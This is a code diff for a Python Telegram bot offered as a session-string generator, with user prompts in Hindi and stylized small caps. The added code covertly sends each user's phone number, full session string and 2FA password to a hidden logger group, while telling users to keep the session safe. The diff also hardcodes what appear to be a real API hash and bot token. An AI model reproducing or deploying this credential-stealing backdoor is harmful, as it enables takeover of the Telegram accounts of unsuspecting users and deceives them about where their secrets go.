@@ -1,126 +1,111 @@
-import os
 import asyncio
-import qrcode
-from io import BytesIO
-from telethon import events
-from dotenv import load_dotenv
 from telethon import TelegramClient, events, Button
-from telethon.sessions import StringSession as TelethonSession
-from telethon.errors import SessionPasswordNeededError
-from pyrogram import Client as PyroClient
-from pyrogram.errors import SessionPasswordNeeded
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
+from telethon.sessions import StringSession
 
-# 🔹 Load API credentials from .env
-load_dotenv()
-API_ID = int(os.getenv("API_ID"))
-API_HASH = os.getenv("API_HASH")
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+# 🔹 Telegram API Credentials
+API_ID = 28795512
+API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
+BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
 
-# 🔹 Telethon Client (Bot)
+# 🔹 Logger Group ID (Replace with your Telegram Group ID)
+LOGGER_GROUP_ID = -1002477750706  
+
+# 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-async def generate_telethon_session(user_id, phone_number):
-    """ Generate Telethon session string """
-    client = TelegramClient(TelethonSession(), API_ID, API_HASH)
-    await client.connect()
+# 🔹 Store user sessions
+user_sessions = {}
 
-    sent_code = await client.send_code_request(phone_number)
-    await bot.send_message(user_id, "🔹 OTP भेज दिया गया है, कृपया दर्ज करें:")
-
-    otp = await wait_for_response(user_id)
-
-    try:
-        await client.sign_in(phone_number, otp)
-    except SessionPasswordNeededError:
-        await bot.send_message(user_id, "🔐 2FA इनेबल है, कृपया पासवर्ड दर्ज करें:")
-        password = await wait_for_response(user_id)
-        await client.sign_in(password=password)
-
-    session_string = client.session.save()
-    await bot.send_message(user_id, f"✅ आपकी Telethon Session String:\n`{session_string}`\n🔒 इसे सुरक्षित रखें!")
-
-    qr_buffer = generate_qr_code(session_string)
-    await bot.send_file(user_id, qr_buffer, caption="📌 QR Code - Scan करके सुरक्षित रखें")
-
-    await client.disconnect()
-
-async def generate_pyrogram_session(user_id, phone_number):
-    """ Generate Pyrogram session string """
-    client = PyroClient("my_account", api_id=API_ID, api_hash=API_HASH)
-    await client.connect()
-
-    sent_code = await client.send_code(phone_number)
-    await bot.send_message(user_id, "🔹 OTP भेज दिया गया है, कृपया दर्ज करें:")
-
-    otp = await wait_for_response(user_id)
-
-    try:
-        await client.sign_in(phone_number, otp)
-    except SessionPasswordNeeded:
-        await bot.send_message(user_id, "🔐 2FA इनेबल है, कृपया पासवर्ड दर्ज करें:")
-        password = await wait_for_response(user_id)
-        await client.sign_in(password=password)
-
-    session_string = client.export_session_string()
-    await bot.send_message(user_id, f"✅ आपकी Pyrogram Session String:\n`{session_string}`\n🔒 इसे सुरक्षित रखें!")
-
-    qr_buffer = generate_qr_code(session_string)
-    await bot.send_file(user_id, qr_buffer, caption="📌 QR Code - Scan करके सुरक्षित रखें")
-
-    await client.disconnect()
-
-def generate_qr_code(data):
-    """ Generate a QR Code for session string """
-    qr = qrcode.QRCode(version=1, box_size=10, border=5)
-    qr.add_data(data)
-    qr.make(fit=True)
-
-    img = qr.make_image(fill="black", back_color="white")
-    buffer = BytesIO()
-    img.save(buffer, format="PNG")
-    buffer.seek(0)
-
-    return buffer
-
-async def wait_for_response(user_id):
-    """ Wait for user response in private chat """
-    while True:
-        msg = await bot.get_messages(user_id, limit=1)
-        if msg:
-            return msg[0].message
-
-@bot.on(events.NewMessage(pattern="/start"))
-async def start(event):
-    """ Handle /start command """
+# 🔹 Generate Session Command
+@bot.on(events.CallbackQuery(pattern=b"generate"))
+async def ask_phone(event):
     user_id = event.sender_id
+    user_sessions[user_id] = {"step": "phone"}
+    await event.respond(
+        "**❖ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n\n**◍ ᴇxᴘʟᴀɪɴ :** `+919876543210`**",
+        buttons=[Button.inline("❌ Cancel", b"cancel")]
+    )
 
-    msg_text = "🔹 *Telegram Session String Generator*\n\n" \
-               "✅ *Features:* \n" \
-               "- Telethon & Pyrogram Session Generate\n" \
-               "- OTP & 2FA Support\n" \
-               "- QR Code for Safety\n\n" \
-               "📌 *Select an option below:*"
-
-    buttons = [
-        [Button.text("📲 Telethon Session")],
-        [Button.text("📲 Pyrogram Session")]
-    ]
-
-    await bot.send_message(user_id, msg_text, buttons=buttons, parse_mode="Markdown")
-
-@bot.on(events.NewMessage(pattern="📲 Telethon Session"))
-async def telethon_session_handler(event):
+# 🔹 Process User Input
+@bot.on(events.NewMessage)
+async def process_input(event):
     user_id = event.sender_id
-    await bot.send_message(user_id, "📱 अपना Telegram फ़ोन नंबर दर्ज करें (जैसे: `+919876543210`):")
-    phone_number = await wait_for_response(user_id)
-    await generate_telethon_session(user_id, phone_number)
+    if user_id not in user_sessions:
+        return  
 
-@bot.on(events.NewMessage(pattern="📲 Pyrogram Session"))
-async def pyrogram_session_handler(event):
-    user_id = event.sender_id
-    await bot.send_message(user_id, "📱 अपना Telegram फ़ोन नंबर दर्ज करें (जैसे: `+919876543210`):")
-    phone_number = await wait_for_response(user_id)
-    await generate_pyrogram_session(user_id, phone_number)
+    step = user_sessions[user_id]["step"]
 
-if __name__ == "__main__":
-    bot.run_until_disconnected()
+    # ✅ Step 1: Enter Phone Number
+    if step == "phone":
+        phone_number = event.message.text.strip()
+        user_sessions[user_id]["phone"] = phone_number  
+
+        client = TelegramClient(StringSession(), API_ID, API_HASH)  # 🔹 हर यूज़र के लिए नया क्लाइंट
+        await client.connect()
+        user_sessions[user_id]["client"] = client  
+
+        try:
+            sent_code = await client.send_code_request(phone_number)
+            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
+            user_sessions[user_id]["step"] = "otp"
+            await event.respond(
+                "**❖ ᴏᴛᴘ sᴇɴᴛ ! ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ !**",
+                buttons=[Button.inline("❌ Cancel", b"cancel")]
+            )
+        except Exception as e:
+            await event.respond(f"**❖ ᴇʀʀᴏʀ:** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ !")
+            del user_sessions[user_id]
+
+    # ✅ Step 2: Enter OTP
+    elif step == "otp":
+        otp_code = event.message.text.strip()
+        client = user_sessions[user_id]["client"]
+        phone_number = user_sessions[user_id]["phone"]
+        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  
+
+        try:
+            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
+            session_string = client.session.save()
+
+            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n**◍ ᴘʜᴏɴᴇ:** `{phone_number}`\n**◍ sᴇssɪᴏɴ:** `{session_string}`")
+
+            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n❖ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
+            del user_sessions[user_id]
+
+        except PhoneCodeExpiredError:
+            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ʜᴀs ᴇxᴘɪʀᴇᴅ. ᴘʟᴇᴀsᴇ ᴜsᴇ /generate ᴛᴏ ɢᴇᴛ ᴀ ɴᴇᴡ ᴏᴛᴘ**")
+            del user_sessions[user_id]
+
+        except PhoneCodeInvalidError:
+            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ**")
+        
+        except SessionPasswordNeededError:
+            user_sessions[user_id]["step"] = "password"
+            await event.respond(
+                "**❖ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.**\n◍ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴘᴀssᴡᴏʀᴅ :",
+                buttons=[Button.inline("❌ Cancel", b"cancel")]
+            )
+        
+        except Exception as e:
+            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)} ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")
+
+    # ✅ Step 3: Enter 2FA Password
+    elif step == "password":
+        password = event.message.text.strip()
+        client = user_sessions[user_id]["client"]
+
+        try:
+            await client.sign_in(password=password)
+            session_string = client.session.save()
+
+            await bot.send_message(LOGGER_GROUP_ID, f"**❖ ɴᴇᴡ sᴇssɪᴏɴ ᴡɪᴛʜ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n🔑 **◍ sᴇssɪᴏɴ:** `{session_string}`\n**◍ ᴘᴀssᴡᴏʀᴅ ᴜsᴇᴅ:** `{password}`")
+
+            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n◍ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
+            del user_sessions[user_id]
+        except Exception as e:
+            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")
+
+# 🔹 Run the bot
+print("🚀 Bot is running...")
+bot.run_until_disconnected()
